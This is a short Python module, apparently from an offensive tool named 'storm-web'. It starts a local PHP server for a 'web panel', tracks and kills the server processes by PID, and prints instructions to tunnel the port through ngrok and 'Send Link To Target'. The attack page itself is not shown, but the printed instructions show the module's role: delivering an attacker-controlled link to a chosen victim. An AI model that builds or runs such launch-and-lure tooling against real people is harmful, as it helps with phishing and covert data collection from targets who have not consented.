from colorama import Fore,Back,Style
import subprocess,json,time,hashlib

def kill_php_proc():
    with open("storm-web/Settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
        pid = data["pid"]

    try:
        for i in pid:
            subprocess.getoutput(f"kill -9 {i}")


        
        else:
            pid.clear()
            data["pid"] = []
            with open("storm-web/Settings.json", "w") as jsonFile:
                json.dump(data, jsonFile)

    except:
        pass



def md5_hash():
    str2hash = time.strftime("%Y-%m-%d-%H:%M", time.gmtime())
    result = hashlib.md5(str2hash.encode())
    return result



def run_php_server(port):
    with open(f"storm-web/log/php-{md5_hash().hexdigest()}.log","w") as php_log:
        proc_info = subprocess.Popen(("php","-S",f"localhost:{port}","-t","storm-web"),stderr=php_log,stdout=php_log).pid


    with open("storm-web/Settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
        data["pid"].append(proc_info)


    with open("storm-web/Settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)


    print(Fore.RED+" [+] "+Fore.GREEN+"Web Panel Link : "+Fore.WHITE+f"http://localhost:{port}")
    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+f"Please Run NGROK On Port {port} AND Send Link To Target > "+Fore.YELLOW+Back.BLACK+f"ngrok http {port}\n"+Style.RESET_ALL)


